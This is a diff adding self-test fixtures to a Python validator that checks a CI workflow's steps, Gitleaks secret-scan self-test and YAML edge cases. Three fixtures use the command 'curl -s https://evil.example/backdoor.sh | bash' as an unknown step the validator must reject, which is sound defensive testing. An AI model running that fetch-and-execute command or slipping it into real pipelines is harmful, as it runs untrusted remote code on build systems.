-                    "mkdir -p .gitleaks-selftest\n"
-                    "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
-                    "if gitleaks dir --no-banner --redact .; then\n"
-                    "  echo not-detected\n"
-                    "fi\n"
-                    "rm -rf .gitleaks-selftest\n"
-                    "printf 'api_key = \"x\"\\n' "
-                    "> .gstack/gitleaks-generated-state-self-test.json\n"
-                    "gitleaks dir --no-banner --redact .\n",
-                ),
-            )
-        ),
-    )
+                )
+            ),
+        )
+        # jobs.security and jobs.docker-build go through the same
+        # require_known_run_steps() loop as jobs.validate; a brand-new,
+        # non-duplicate-named step in either must still be rejected.
+        expect_fail(
+            "workflow unknown security step",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: steps
+                    + [
+                        {
+                            "name": "Totally new unrelated security step",
+                            "run": "curl -s https://evil.example/backdoor.sh | bash",
+                        }
+                    ],
+                )
+            ),
+        )
+        expect_fail(
+            "workflow unknown docker-build step",
+            lambda: validate_workflow(
+                workflow_with(
+                    "docker-build",
+                    lambda steps: steps
+                    + [
+                        {
+                            "name": "Totally new unrelated docker step",
+                            "run": "curl -s https://evil.example/backdoor.sh | bash",
+                        }
+                    ],
+                )
+            ),
+        )
+        # workflow_with() only mutates steps within an existing job, so an
+        # entirely new job needs its own fixture: a brand-new, undocumented job
+        # must fail even though validate/security/docker-build are all present
+        # and untouched.
+        expect_fail(
+            "workflow undocumented extra job",
+            lambda: validate_workflow(
+                dict(
+                    copy.deepcopy(base_jobs),
+                    deploy={
+                        "runs-on": "ubuntu-latest",
+                        "steps": [
+                            {
+                                "name": "Totally new deploy step",
+                                "run": "curl -s https://evil.example/backdoor.sh | bash",
+                            }
+                        ],
+                    },
+                )
+            ),
+        )
+        # The Gitleaks config self-test step must prove BOTH control directions.
+        # Dropping just the "exit 1" (the positive-control failure branch) must
+        # still be caught, or this step could be weakened to a no-op scan.
+        expect_fail(
+            "workflow gitleaks config self-test missing positive control",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Self-test repo config detects and excludes correctly",
+                        "trap 'rm -rf .gitleaks-selftest' EXIT\n"
+                        "mkdir -p .gitleaks-selftest\n"
+                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
+                        "if gitleaks dir --no-banner --redact .; then\n"
+                        "  echo not-detected\n"
+                        "fi\n"
+                        "rm -rf .gitleaks-selftest\n"
+                        "printf 'api_key = \"x\"\\n' "
+                        "> .gstack/gitleaks-generated-state-self-test.json\n"
+                        "gitleaks dir --no-banner --redact .\n",
+                    ),
+                )
+            ),
+        )
+        # Substring matching accepted this: the bare exclusion scan is a
+        # substring of the `if` line and the .gstack path appears in the trap
+        # line, so deleting the entire exclusion control still passed.
+        expect_fail(
+            "workflow gitleaks config self-test missing exclusion control",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Self-test repo config detects and excludes correctly",
+                        "trap 'rm -rf .gitleaks-selftest "
+                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
+                        "mkdir -p .gitleaks-selftest\n"
+                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
+                        "if gitleaks dir --no-banner --redact .; then\n"
+                        "  echo not-detected >&2\n"
+                        "  exit 1\n"
+                        "fi\n",
+                    ),
+                )
+            ),
+        )
+        # Presence is order-independent: hoisting the exclusion scan above the
+        # .gstack plant leaves every marker present while that scan runs on a
+        # clean tree and proves nothing.
+        expect_fail(
+            "workflow gitleaks config self-test controls out of order",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Self-test repo config detects and excludes correctly",
+                        "trap 'rm -rf .gitleaks-selftest "
+                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
+                        "mkdir -p .gitleaks-selftest .gstack\n"
+                        "gitleaks dir --no-banner --redact .\n"
+                        "printf 'api_key = \"x\"\\n' "
+                        "> .gstack/gitleaks-generated-state-self-test.json\n"
+                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
+                        "if gitleaks dir --no-banner --redact .; then\n"
+                        "  exit 1\n"
+                        "fi\n",
+                    ),
+                )
+            ),
+        )
+        # A no-op `trap '' EXIT` satisfies a bare `trap ` prefix check while
+        # leaving both planted secrets in the workspace.
+        expect_fail(
+            "workflow gitleaks config self-test no-op trap",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Self-test repo config detects and excludes correctly",
+                        "trap '' EXIT\n"
+                        "mkdir -p .gitleaks-selftest .gstack\n"
+                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
+                        "if gitleaks dir --no-banner --redact .; then\n"
+                        "  exit 1\n"
+                        "fi\n"
+                        "printf 'api_key = \"x\"\\n' "
+                        "> .gstack/gitleaks-generated-state-self-test.json\n"
+                        "gitleaks dir --no-banner --redact .\n",
+                    ),
+                )
+            ),
+        )
+        # Markers inside `#` comments prove nothing: the step would execute no
+        # control at all while every required fragment still matched.
+        expect_fail(
+            "workflow gitleaks config self-test commented out",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Self-test repo config detects and excludes correctly",
+                        "# trap 'rm -rf .gitleaks-selftest' EXIT\n"
+                        "# printf 'api_key' > .gitleaks-selftest/planted.txt\n"
+                        "# if gitleaks dir --no-banner --redact .; then\n"
+                        "# exit 1\n"
+                        "# printf 'api_key' "
+                        "> .gstack/gitleaks-generated-state-self-test.json\n"
+                        "# gitleaks dir --no-banner --redact .\n"
+                        "true\n",
+                    ),
+                )
+            ),
+        )
+        # Same hazard on the whitespace support step, the only other step
+        # matched against comment-stripped command lines. Other content-checked
+        # steps still use raw substring matching — tracked in TODOS.md.
+        expect_fail(
+            "workflow whitespace check commented out",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Check whitespace",
+                        '# git diff --check "$BASE_SHA...$HEAD_SHA"\n'
+                        "# git diff --check\n"
+                        "true\n",
+                    ),
+                )
+            ),
+        )
+        # `\s` matched newlines, so a block scalar split across lines satisfied
+        # the "fully anchored" gate pattern while the shell ran two commands.
+        expect_fail(
+            "workflow gate split across lines",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: set_step_run(
+                        steps,
+                        "Check Python syntax",
+                        "python -m py_compile "
+                        "aqara_fp2_sleep/aqara_fp2_sleep_poller.py "
+                        "scripts/validate_repository.py "
+                        "videos/quiet_proof_loops.py "
+                        "videos/validate-gif-batch.py\n"
+                        "videos/build-gif-deliverables.py\n",
+                    ),
+                )
+            ),
+        )
+        # BASE_SHA/HEAD_SHA come from the workflow env, not the shell: without
+        # them the range compare expands to `git diff --check "..."` and checks
+        # nothing, while the executed command line still matches every guard.
+        expect_fail(
+            "workflow whitespace step without BASE_SHA/HEAD_SHA env",
+            lambda: validate_workflow(
+                workflow_with(
+                    "validate",
+                    lambda steps: set_step_env(steps, "Check whitespace", {}),
+                )
+            ),
+        )
+        # YAML types `on`, `yes` and `off` as bools, all legal GitHub job ids.
+        # Sorting a mixed-type set must report the actionable failure rather
+        # than raising TypeError out of sorted().
+        mixed_jobs = copy.deepcopy(base_jobs)
+        mixed_jobs[True] = {"runs-on": "ubuntu-latest", "steps": []}
+        mixed_jobs["deploy"] = {"runs-on": "ubuntu-latest", "steps": []}
+        expect_fail(
+            "workflow extra job ids of mixed YAML types",
+            lambda: validate_workflow(mixed_jobs),
+        )
+        # Same hazard one level down, on the duplicate-step-name report.
+        expect_fail(
+            "workflow duplicate step names of mixed YAML types",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: steps
+                    + [
+                        {"name": True, "run": "true"},
+                        {"name": True, "run": "true"},
+                        {"name": "Sneaky", "run": "true"},
+                        {"name": "Sneaky", "run": "true"},
+                    ],
+                )
+            ),
+        )
+        # A job entry that is not a mapping must fail closed rather than
+        # raising AttributeError out of job_steps().
+        expect_fail(
+            "workflow job entry not a mapping",
+            lambda: validate_workflow(
+                dict(copy.deepcopy(base_jobs), security="nope")
+            ),
+        )
+        # PyYAML types `run: on` as True; GitHub Actions still runs it, so an
+        # isinstance(str) gate would skip every check for that step.
+        expect_fail(
+            "workflow non-string run scalar",
+            lambda: validate_workflow(
+                workflow_with(
+                    "security",
+                    lambda steps: steps + [{"name": "Sneaky", "run": True}],
+                )
+            ),
+        )
+        # A missing required job must be a ValidationError, not a raw KeyError
+        # out of job_steps() — expect_fail() only catches the former, so the
+        # crash would abort the whole self-test instead of being recorded.
+        expect_fail(
+            "workflow missing required job",
+            lambda: validate_workflow(
+                {
+                    name: copy.deepcopy(job)
+                    for name, job in base_jobs.items()
+                    if name != "security"
+                }
+            ),
+        )
+
+    if base_jobs is not None:
+        workflow_fixtures(base_jobs)
     expect_fail(
         "conductor settings gate order swapped",
         lambda: validate_conductor_settings(
@@ -1730,20 +2207,6 @@ def run_self_test() -> None:
                 'run = "exit 0 && git diff --check',
             )
         ),
-    )
-    conductor_settings_without_baseline = mutate(
-        conductor_settings,
-        f" && {CONDUCTOR_BASELINE_COMMAND}",
-        "",
-    )
-    conductor_settings_with_decoy = (
-        conductor_settings_without_baseline
-        + "\n[unrelated]\n"
-        + f"command = {json.dumps(conductor_command)}\n"
-    )
-    expect_fail(
-        "conductor settings ignores unrelated command decoy",
-        lambda: validate_conductor_settings(conductor_settings_with_decoy),
     )
     expect_fail(
         "favicon drift",
